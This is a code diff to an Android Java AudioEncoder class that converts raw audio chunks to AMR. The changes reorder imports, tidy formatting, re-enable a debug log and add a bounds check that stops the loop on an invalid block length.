@@ -1,16 +1,5 @@
 package com.android.dvci.util;
 
-import java.io.ByteArrayInputStream;
-import java.io.File;
-import java.io.FileInputStream;
-import java.io.FileOutputStream;
-import java.io.IOException;
-import java.io.InputStream;
-import java.io.OutputStream;
-import java.nio.ByteBuffer;
-import java.nio.ByteOrder;
-import java.util.Date;
-
 import android.media.AmrInputStream;
 
 import com.android.dvci.Status;
@@ -21,6 +10,17 @@ import com.android.dvci.resample.Resample;
 import com.android.mm.M;
 import com.musicg.wave.Wave;
 import com.musicg.wave.WaveHeader;
+
+import java.io.ByteArrayInputStream;
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.OutputStream;
+import java.nio.ByteBuffer;
+import java.nio.ByteOrder;
+import java.util.Date;
 
 public class AudioEncoder {
 	private static final String TAG = "AudioEncoding";
@@ -46,7 +46,7 @@ public class AudioEncoder {
 
 	public int getInferredSampleRate() {
 		float min = Float.MAX_VALUE;
-		int bitrates[] = { 8000, 11025, 16000, 22050, 32000, 44100, 48000, 88200, 96000, 176400, 192000, 352800, 384000 };
+		int bitrates[] = {8000, 11025, 16000, 22050, 32000, 44100, 48000, 88200, 96000, 176400, 192000, 352800, 384000};
 		int calc = -1;
 
 		int delta = last_epoch - first_epoch;
@@ -120,9 +120,9 @@ public class AudioEncoder {
 			return false;
 		}
 
-	    File file = new File(outFile);
-	    
-	    if (Cfg.DEBUG) {
+		File file = new File(outFile);
+
+		if (Cfg.DEBUG) {
 			Check.log(TAG + "(encodetoAmr): Encoding raw to: " + file.getName());
 
 		}
@@ -229,8 +229,14 @@ public class AudioEncoder {
 				int cur_epoch = d.getInt();
 
 				d.position(d.position() + discard_frame_size); // Discard streamType and
-												// sampleRate
+				// sampleRate
 				blockLen = d.getInt();
+				if (blockLen < 0 || blockLen > d.remaining()) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (decodeRawChunks), OUT of BAND, blockLen: "+ blockLen + " remaining: "+ d.remaining());
+					}
+					break;
+				}
 
 				// Discarded bytes must be discarded in the next loop too
 				if (blockLen != discard_frame_size) {
@@ -243,10 +249,10 @@ public class AudioEncoder {
 				}
 
 				if (Cfg.DEBUG) {
-					// Check.log(TAG + "(encodeChunks): blockLen: " + blockLen +
-					// " remaining: " + d.remaining() + " current position: " +
-					// d.position() + " next position: " + (d.position() +
-					// blockLen));
+					Check.log(TAG + "(encodeChunks): blockLen: " + blockLen +
+							" remaining: " + d.remaining() + " current position: " +
+							d.position() + " next position: " + (d.position() +
+							blockLen));
 				}
 
 				d.position(d.position() + blockLen);
